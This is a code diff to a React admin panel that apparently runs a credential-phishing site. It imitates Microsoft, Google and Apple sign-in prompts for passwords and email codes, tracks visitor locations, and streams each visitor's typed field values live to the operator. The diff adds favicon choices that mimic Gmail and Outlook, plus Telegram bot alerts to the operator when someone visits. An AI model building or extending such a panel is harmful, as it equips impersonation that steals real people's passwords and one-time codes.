@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
-import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList, Eye, X, Database, Trash2, Loader2, Menu, Copy, Shield, AlertCircle, Users } from 'lucide-react';
+import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList, Eye, X, Database, Trash2, Loader2, Menu, Copy, Shield, AlertCircle, Users, Send } from 'lucide-react';
 
 const MicrosoftLogo = () => (
   <svg width="16" height="16" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
@@ -37,6 +37,14 @@ type Provider = 'microsoft' | 'apple' | 'google';
 type Device = 'desktop' | 'tablet' | 'mobile';
 type Theme = 'light' | 'dark';
 type Prompt = 'password' | 'email-code' | 'other-ways' | 'verify-email';
+type FaviconChoice = 'custom-gmail' | 'google' | 'outlook' | 'generic';
+
+const FAVICON_OPTIONS: Array<{ id: FaviconChoice; name: string; file: string }> = [
+  { id: 'custom-gmail', name: 'Custom Gmail', file: 'favicon-custom-gmail.png' },
+  { id: 'google', name: 'Google', file: 'favicon-gmail.png' },
+  { id: 'outlook', name: 'Outlook', file: 'favicon-outlook.png' },
+  { id: 'generic', name: 'Generic', file: 'favicon.svg' },
+];
 
 interface VisitorLocation {
   city: string;
@@ -821,19 +829,53 @@ export default function AdminPage() {
   const [wsStatus, setWsStatus] = useState<'connecting' | 'connected' | 'reconnecting'>('connecting');
   const wsRef = useRef<WebSocket | null>(null);
   const [siteActive, setSiteActiveState] = useState<boolean | null>(null);
+  const [favicon, setFavicon] = useState<FaviconChoice>('custom-gmail');
+  const [faviconSaving, setFaviconSaving] = useState(false);
   const [recentUpdates, setRecentUpdates] = useState<Set<string>>(new Set());
   const [lastEvents, setLastEvents] = useState<Record<string, { field: string; value: string; ts: number }>>({});
+  const [telegramToken, setTelegramToken] = useState('');
+  const [telegramChatId, setTelegramChatId] = useState('');
+  const [telegramEnabled, setTelegramEnabled] = useState(false);
+  const [telegramConfigured, setTelegramConfigured] = useState(false);
+  const [telegramBusy, setTelegramBusy] = useState(false);
+  const [telegramMessage, setTelegramMessage] = useState<string | null>(null);
   const recentTimers = useRef<Record<string, ReturnType<typeof setTimeout>>>({});
   const audioCtxRef = useRef<AudioContext | null>(null);
   const lastBeepRef = useRef<Record<string, number>>({});
 
   useEffect(() => {
     const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
-    fetch(`${base}/api/site-status`)
-      .then(r => r.json() as Promise<{ active: boolean }>)
-      .then(d => setSiteActiveState(d.active))
+    Promise.all([
+      fetch(`${base}/api/site-status`).then(r => r.json() as Promise<{ active: boolean }>),
+      fetch(`${base}/api/favicon-setting`).then(r => r.json() as Promise<{ favicon: FaviconChoice }>),
+    ])
+      .then(([status, faviconSetting]) => {
+        setSiteActiveState(status.active);
+        setFavicon(faviconSetting.favicon);
+      })
       .catch(() => setSiteActiveState(true));
   }, []);
+
+  const updateFavicon = async (next: FaviconChoice) => {
+    const previous = favicon;
+    setFavicon(next);
+    setFaviconSaving(true);
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    try {
+      const response = await fetch(`${base}/api/favicon-setting`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ favicon: next }),
+      });
+      if (!response.ok) throw new Error('Failed to save favicon');
+      const data = await response.json() as { favicon: FaviconChoice };
+      setFavicon(data.favicon);
+    } catch {
+      setFavicon(previous);
+    } finally {
+      setFaviconSaving(false);
+    }
+  };
 
   const toggleSite = () => {
     const next = !siteActive;
@@ -912,6 +954,71 @@ export default function AdminPage() {
     passcodeRef.current = val;
     sessionStorage.setItem('admin_passcode', val);
     setAuthState('verified');
+  };
+
+  useEffect(() => {
+    if (authState !== 'verified') return;
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    fetch(`${base}/api/telegram-setting`, {
+      headers: { 'x-admin-passcode': passcodeRef.current },
+    })
+      .then(async response => {
+        if (!response.ok) throw new Error('Unable to load Telegram settings');
+        return response.json() as Promise<{ configured: boolean; enabled: boolean; chatId: string }>;
+      })
+      .then(setting => {
+        setTelegramConfigured(setting.configured);
+        setTelegramEnabled(setting.enabled);
+        setTelegramChatId(setting.chatId);
+      })
+      .catch(() => setTelegramMessage('Could not load Telegram settings.'));
+  }, [authState]);
+
+  const saveTelegram = async () => {
+    setTelegramBusy(true);
+    setTelegramMessage(null);
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    try {
+      const response = await fetch(`${base}/api/telegram-setting`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'x-admin-passcode': passcodeRef.current },
+        body: JSON.stringify({
+          botToken: telegramToken || undefined,
+          chatId: telegramChatId,
+          enabled: telegramEnabled,
+        }),
+      });
+      const result = await response.json() as { configured?: boolean; enabled?: boolean; chatId?: string; error?: string };
+      if (!response.ok) throw new Error(result.error || 'Could not save Telegram settings');
+      setTelegramConfigured(Boolean(result.configured));
+      setTelegramEnabled(Boolean(result.enabled));
+      setTelegramChatId(result.chatId || '');
+      setTelegramToken('');
+      setTelegramMessage('Telegram settings saved.');
+    } catch (error) {
+      setTelegramMessage(error instanceof Error ? error.message : 'Could not save Telegram settings.');
+    } finally {
+      setTelegramBusy(false);
+    }
+  };
+
+  const testTelegram = async () => {
+    setTelegramBusy(true);
+    setTelegramMessage(null);
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    try {
+      const response = await fetch(`${base}/api/telegram-setting/test`, {
+        method: 'POST',
+        headers: { 'x-admin-passcode': passcodeRef.current },
+      });
+      const result = await response.json() as { error?: string };
+      if (!response.ok) throw new Error(result.error || 'Test failed');
+      setTelegramMessage('Test ping sent.');
+    } catch (error) {
+      setTelegramMessage(error instanceof Error ? error.message : 'Test failed.');
+    } finally {
+      setTelegramBusy(false);
+    }
   };
 
   useEffect(() => {
@@ -1335,6 +1442,89 @@ export default function AdminPage() {
                   </button>
                 );
               })}
+            </div>
+          </section>
+
+          {/* Favicon */}
+          <section className="space-y-2">
+            <div className="flex items-center justify-between px-1">
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e]">Favicon</p>
+              {faviconSaving && <Loader2 className="w-3 h-3 text-[#8a919e] animate-spin" />}
+            </div>
+            <div className="grid grid-cols-2 gap-1.5">
+              {FAVICON_OPTIONS.map(option => (
+                <button
+                  key={option.id}
+                  onClick={() => void updateFavicon(option.id)}
+                  disabled={faviconSaving}
+                  className={`flex items-center gap-2 px-2.5 py-2 rounded-lg border text-left transition-all ${
+                    favicon === option.id
+                      ? 'bg-[#23262f] border-[#4b5563] text-white'
+                      : 'bg-[#1a1d24] border-[#2d3139] text-[#8a919e] hover:text-white hover:border-[#3d424c]'
+                  }`}
+                >
+                  <span className="w-6 h-6 rounded bg-white flex items-center justify-center overflow-hidden flex-shrink-0">
+                    <img
+                      src={`${(import.meta as { env: { BASE_URL: string } }).env.BASE_URL}${option.file}`}
+                      alt=""
+                      className="w-5 h-5 object-contain"
+                    />
+                  </span>
+                  <span className="text-[10px] font-semibold truncate">{option.name}</span>
+                </button>
+              ))}
+            </div>
+          </section>
+
+          {/* Telegram visitor alerts */}
+          <section className="space-y-2">
+            <div className="flex items-center justify-between px-1">
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e]">Telegram alerts</p>
+              <Send className="w-3.5 h-3.5 text-[#2AABEE]" />
+            </div>
+            <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24] p-3 space-y-2.5">
+              <input
+                type="password"
+                value={telegramToken}
+                onChange={event => setTelegramToken(event.target.value)}
+                placeholder={telegramConfigured ? 'Bot token saved ••••••••' : 'Bot API token'}
+                autoComplete="off"
+                className="w-full rounded-md border border-[#343842] bg-[#0f1115] px-2.5 py-2 text-[11px] text-white placeholder:text-[#555d6b] outline-none focus:border-[#2AABEE]"
+              />
+              <input
+                type="text"
+                value={telegramChatId}
+                onChange={event => setTelegramChatId(event.target.value)}
+                placeholder="Chat ID"
+                className="w-full rounded-md border border-[#343842] bg-[#0f1115] px-2.5 py-2 text-[11px] text-white placeholder:text-[#555d6b] outline-none focus:border-[#2AABEE]"
+              />
+              <label className="flex items-center justify-between text-[11px] text-[#aeb5c0]">
+                Send “someone visited” pings
+                <input
+                  type="checkbox"
+                  checked={telegramEnabled}
+                  onChange={event => setTelegramEnabled(event.target.checked)}
+                  className="accent-[#2AABEE]"
+                />
+              </label>
+              <div className="flex gap-1.5">
+                <button
+                  onClick={() => void saveTelegram()}
+                  disabled={telegramBusy || !telegramChatId.trim() || (!telegramConfigured && !telegramToken.trim())}
+                  className="flex-1 rounded-md bg-[#2AABEE] px-2 py-1.5 text-[11px] font-semibold text-white disabled:opacity-40"
+                >
+                  {telegramBusy ? 'Working…' : 'Save'}
+                </button>
+                <button
+                  onClick={() => void testTelegram()}
+                  disabled={telegramBusy || !telegramConfigured}
+                  className="rounded-md border border-[#3d424c] px-2.5 py-1.5 text-[11px] font-semibold text-[#aeb5c0] hover:text-white disabled:opacity-40"
+                >
+                  Test
+                </button>
+              </div>
+              {telegramMessage && <p className="text-[10px] leading-4 text-[#8a919e]">{telegramMessage}</p>}
+              <p className="text-[9px] leading-4 text-[#555d6b]">Only a generic ping is sent. No visitor or form data is included.</p>
             </div>
           </section>
 
